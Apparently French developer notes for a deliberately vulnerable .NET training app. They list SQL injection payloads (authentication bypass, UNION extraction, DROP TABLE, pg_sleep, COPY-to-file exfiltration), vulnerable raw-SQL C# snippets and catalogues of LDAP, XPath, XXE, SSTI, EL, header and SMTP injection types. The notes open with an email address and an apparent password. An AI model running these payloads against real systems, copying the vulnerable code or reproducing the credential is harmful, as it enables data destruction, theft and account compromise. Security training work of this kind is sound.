stephane.belkheraz@stago.com
Stago-*$PP987

dotnet ef migrations add InitialCreate
dotnet ef database update


Injection SQL

Payloads classiques d�injection SQL � tester

admin' --	
(Ignore le reste de la requ�te)

admin' OR '1'='1	
(Retourne toutes les lignes)

'; DROP TABLE Users;--	
(Supprime la table Users (ex�cute un DROP))

' UNION SELECT username, password FROM users--	
Fusionne un autre SELECT

' OR 1=1;--
supprime les donn�es dans le cadre d'un delete




' OR '1'='1	Retourne tous les produits (bypass filtre)
%'; DROP TABLE products;--	Supprime la table products (attaque destructrice)
%'; SELECT pg_sleep(5);--	Ralentit la requ�te (attaque DoS simple)
%'; COPY products TO '/tmp/pwned.csv' CSV;--	Exfiltration par copie fichier (si droits DB)
%'; SELECT version();--	R�cup�ration version PostgreSQL

____________________________________________
Injection en lecture avanc�e (exfiltration)

Si l�appli affiche directement le r�sultat SQL, on peut utiliser une injection pour extraire des donn�es sensibles 
(par exemple, concat�ner des colonnes ou exploiter une union) :

%' UNION SELECT 1, version(), 'malicious'-- 

var sql = $"SELECT id, name, description FROM products WHERE name LIKE '%{productName}%'";
var products = _db.Products.FromSqlRaw(sql).ToList();

On va injecter %' UNION SELECT 1, version(), 'x'-- pour forcer la DB � retourner la version dans la colonne name.

____________________________________________
Injection sur commandes de modification/suppression

Exemple pour un endpoint vuln�rable supprimant un produit par nom :

[HttpPost]
public IActionResult Delete(string productName)
{
    var sql = $"DELETE FROM products WHERE name = '{productName}'";
    int deleted = _db.Database.ExecuteSqlRaw(sql);
    return Content($"{deleted} produit(s) supprim�(s)");
}

Injection possible : anything'; DROP TABLE products;--
=> Supprime la table enti�re !

____________________________________________
Injection avec param�tre multiple & requ�tes compos�es

PostgreSQL accepte les requ�tes multiples s�par�es par ; dans certains cas, donc injection peut faire plusieurs actions :

'; DELETE FROM products WHERE id > 0; -- 


____________________________________________
Contr�leur InjectionLdapController :

8 types d'attaques LDAP diff�rentes (basic, wildcard, boolean, null, attributes, blind, escape, dn)
Simulation d'un annuaire LDAP avec des donn�es r�alistes
Construction de filtres LDAP vuln�rables
Gestion des diff�rents sc�narios d'injection

____________________________________________
Contr�leur InjectionXpathController :

8 types d'attaques XPath : basic, union, position, string, count, comment, boolean, wildcard
Document XML simul� avec des donn�es sensibles (mots de passe, cartes de cr�dit, cl�s API)
Ex�cution r�elle de requ�tes XPath vuln�rables
Gestion des r�sultats scalaires et n�uds
____________________________________________
Contr�leur InjectionXxeController :

8 types d'attaques XXE :

file : Lecture de fichiers locaux (ex: /etc/passwd)
ssrf : Server-Side Request Forgery
dos : Denial of Service (Billion Laughs)
parameter : Entit�s param�tr�es avec DTD externes
blind : XXE aveugle avec exfiltration out-of-band
internal : DTD interne
php : Wrappers PHP sp�cifiques
oob : Out-of-Band via DNS/HTTP



____________________________________________

Contr�leur InjectionTemplateController :

8 types d'attaques SSTI :

basic : Expressions Razor simples (@(7*7))
code : Blocs de code C# arbitraire
system : Acc�s aux informations syst�me
file : Lecture de fichiers locaux
reflection : Utilisation de la r�flexion .NET
network : Requ�tes r�seau (SSRF)
loop : DoS via boucles intensives
database : Exposition de cha�nes de connexion


Simulation s�curis�e : Le code ne compile pas vraiment les templates Razor (trop dangereux), mais simule les r�sultats de mani�re r�aliste

____________________________________________

Contr�leur InjectionElController :

8 types d'attaques EL :

basic : Expressions EL simples (${7*7}, ${user.name})
method : Invocation de m�thodes dangereuses
reflection : Utilisation de la r�flexion Java/.NET
spring : Injection SpEL (Spring Expression Language)
ognl : Injection OGNL (Struts)
nested : Expressions imbriqu�es complexes
bypass : Techniques de contournement de filtres
polyglot : Payloads fonctionnant sur plusieurs moteurs

____________________________________________

HeaderInjectionController.cs
Le contr�leur g�re 8 types d'attaques diff�rentes :

redirect : Redirection malveillante via l'en-t�te Location
xss : Injection XSS via le corps de la r�ponse HTTP
cookie : Injection de cookies malveillants
cache : Empoisonnement du cache
cors : Manipulation des en-t�tes CORS
security : D�sactivation des en-t�tes de s�curit�
smuggling : HTTP Request Smuggling
custom : En-t�tes personnalis�s

____________________________________________

InjectionSmtpController.cs
Le contr�leur g�re 8 types d'attaques diff�rentes :

header : Injection d'en-t�tes SMTP (Bcc, Cc, etc.)
recipient : Ajout de destinataires non autoris�s
subject : Manipulation du sujet et injection de contenu
sender : Usurpation d'identit� (spoofing From)
attachment : Injection MIME pour pi�ces jointes
spam : Utilisation comme relais de spam
command : Injection de commandes SMTP directes
xss : Injection HTML/JavaScript dans les emails
____________________________________________



____________________________________________


____________________________________________



____________________________________________


____________________________________________



____________________________________________